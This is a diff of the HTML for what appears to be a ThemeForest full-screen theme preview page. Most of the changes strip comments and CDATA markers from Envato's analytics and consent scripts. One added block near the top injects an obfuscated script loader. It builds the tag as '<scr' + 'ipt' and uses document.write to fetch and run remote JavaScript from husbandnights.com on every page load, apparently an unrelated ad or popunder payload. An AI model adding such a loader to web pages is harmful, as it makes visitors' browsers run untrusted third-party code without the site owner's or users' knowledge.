@@ -25,9 +25,17 @@
     <link href="https://public-assets.envato-static.com/icons/themeforest.net/apple-touch-icon-precomposed.png" rel="apple-touch-icon-precomposed" type="image/x-icon"/>
     <script nonce="EMRioFHvbfbCyeIUVMXpcA==" src="https://public-assets.envato-static.com/assets/market/pages/full_screen_preview/index-3256054c335e92012f49f8dce744657f8dc8b7333c815ff885ea733bb210d7ad.js">
     </script>
+  <script type="text/javascript">
+    atOptions = {
+      'key': '463953c77270cce6c407635f538a6abb',
+      'format': 'iframe',
+      'height': 300,
+      'width': 160,
+      'params': {}
+    };
+    document.write('<scr' + 'ipt type="text/javascript" src="//husbandnights.com/463953c77270cce6c407635f538a6abb/invoke.js"></scr' + 'ipt>');
+  </script>
     <script nonce="EMRioFHvbfbCyeIUVMXpcA==">
-     //<![CDATA[
-      //function to fix height of iframe!
       var calcHeight = function() {
         var headerDimensions = $('.preview__header').height();
         $('.full-screen-preview__frame').height($(window).height() - headerDimensions);
@@ -43,7 +51,6 @@
         calcHeight();
       });
 
-//]]>
     </script>
    </meta>
   </meta>
@@ -54,10 +61,8 @@
   <iframe allow="geolocation 'self'; autoplay 'self'" class="full-screen-preview__frame" data-view="fullScreenPreview" frameborder="0" name="preview-frame" noresize="noresize" src="https://xeco.themegenix.net/">
   </iframe>
   <script nonce="EMRioFHvbfbCyeIUVMXpcA==">
-   //<![CDATA[
       $(function(){viewloader.execute(Views);});
 
-//]]>
   </script>
   <div class="is-hidden" data-cookiebot-enabled="true" data-view="affiliatesTracker" id="affiliate-tracker">
   </div>
@@ -66,7 +71,6 @@
   <script nonce="EMRioFHvbfbCyeIUVMXpcA==" src="https://public-assets.envato-static.com/assets/market/core/standard_measurements-3bc54d0cbac28acaf9e49915490168f52bb9b8bea5d35f6edabb67a686a83af4.js">
   </script>
   <script nonce="EMRioFHvbfbCyeIUVMXpcA==">
-   //<![CDATA[
   var ACCOUNTS = ["m"];
   window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
 
@@ -104,9 +108,6 @@
   }
 
   function trimGacUaCookies() {
-    // Trim the list of gac cookies and only leave the most recent ones. This
-    // prevents rejecting the request later on when the cookie size grows larger
-    // than nginx buffers.
     let maxCookies = 15;
     var gacCookies = [];
 
@@ -174,18 +175,14 @@
     var payload = {"name":"m","allowLinker":true};
     var accountId = "UA-11834194-7";
 
-    // Set the GA User Opt-out flag
     window['ga-disable-'+accountId] = true;
 
-    // Do not explicitly make any further calls to ga()
     ga(payload.name+".remove");
 
-    // Delete any existing GA cookies (_ga, _gat & _gaid) and GA Client ID from localStorage
     delete_cookie_by_name('_ga');
     delete_cookie_by_name('_gat');
     delete_cookie_by_name('_gid');
 
-    // Delete LocalStorage Entries
     if (Market.Helpers.GaLsUtils.localStorageAvailable()) {
       var clientId = Market.Helpers.GaLsUtils.getClientId();
 
@@ -196,7 +193,6 @@
       Market.Helpers.GaLsUtils.removeClientId();
     }
 
-    // Do not transmit the Client ID to other sites upon navigation (i.e. autoLink)
   }
 
   function domLoaded() {
@@ -285,15 +281,9 @@
         decorateLink(event);
       });
       document.body.addEventListener('contextmenu', function(event) {
-        // Aside from a normal click, we need to handle the variety of ways users
-        // can open a link in a new tab
-        // Right click to open context menu
         decorateLink(event);
       });
       document.body.addEventListener('mousedown', function(event) {
-        // Aside from a normal click, we need to handle the variety of ways users
-        // can open a link in a new tab
-        // Middle mouse button click
         if (event.button === 1) {
           decorateLink(event);
         }
@@ -367,7 +357,6 @@
 
         var itemPageIdMatch = window.location.pathname.match(/^\/item\/[a-z-]+\/(?:reviews\/)?(\d+)(?:\/comments|\/support)?$/);
         if (itemPageIdMatch) {
-          // Fetch item ID from path
           var itemId = itemPageIdMatch[1];
           ga(t+'.set', 'dimension23', itemId);
         }
@@ -385,7 +374,6 @@
               page: ''
             });
           } else if ('') {
-            // append the analytics_suffix to the page path so the flash alert/error type can be tracked
             var analyticsSuffix = $.trim('').replace(/([A-Z])/g, '$1').replace(/[-_\s]+/g, '-').toLowerCase();
             var uri = URI(window.location.pathname + window.location.search);
             uri.path(uri.path() + '/' + analyticsSuffix);
@@ -421,12 +409,8 @@
     });
   }
 
-  
-
-//]]>
-  </script>
+    </script>
   <script nonce="EMRioFHvbfbCyeIUVMXpcA==">
-   //<![CDATA[
 
     if (typeof Cookiebot !== 'undefined' && Cookiebot.consent && Cookiebot.consent.statistics ) {
       enableGoogleAnalyticsLinkWrapper();
@@ -439,17 +423,12 @@
     }
 
   function enableGoogleAnalyticsLinkWrapper() {
-    // GA: universal analytics link wrapper
     (function(){
         window._envTrkrs = [["m", "UA-11834194-7"]];
 
         var debug = false;
         var MAX_RETRIES = 10;
 
-        /*
-           The script needs to wait until the Analytics script
-           has been downloaded from Google before initializing
-        */
         var waitForAnalytics = function(){
             this.count = this.count || 0;
 
@@ -631,25 +610,21 @@
     })()
   }
 
-//]]>
+
   </script>
   <script nonce="EMRioFHvbfbCyeIUVMXpcA==">
-   //<![CDATA[
-  // Set Datadog custom attributes
   (function () {
     if (typeof window.datadog_attributes != 'object')
       window.datadog_attributes = {}
     window.datadog_attributes['pageType'] = 'other'
 
-    // Log experiment enrolment
     var experiment_data_string = "" + "!"
     window.datadog_attributes['experiments'] = experiment_data_string
   })()
 
-//]]>
   </script>
   <script nonce="EMRioFHvbfbCyeIUVMXpcA==">
-   //<![CDATA[
+
     if (typeof Cookiebot !== 'undefined' && Cookiebot.consent && Cookiebot.consent.marketing) {
       enableMarketingGoogleTagManager();
     } else {
@@ -662,7 +637,6 @@
 
   function enableMarketingGoogleTagManager() {
     var gtmId = 'GTM-585RXMV';
-    // Google Tag Manager Tracking Code
     (function(w,d,s,l,i) {
       w[l]=w[l]||[];w[l].push({'gtm.start':
         new Date().getTime(),event:'gtm.js'});
@@ -680,7 +654,6 @@
     });
   }
 
-//]]>
   </script>
  </body>
 </html>
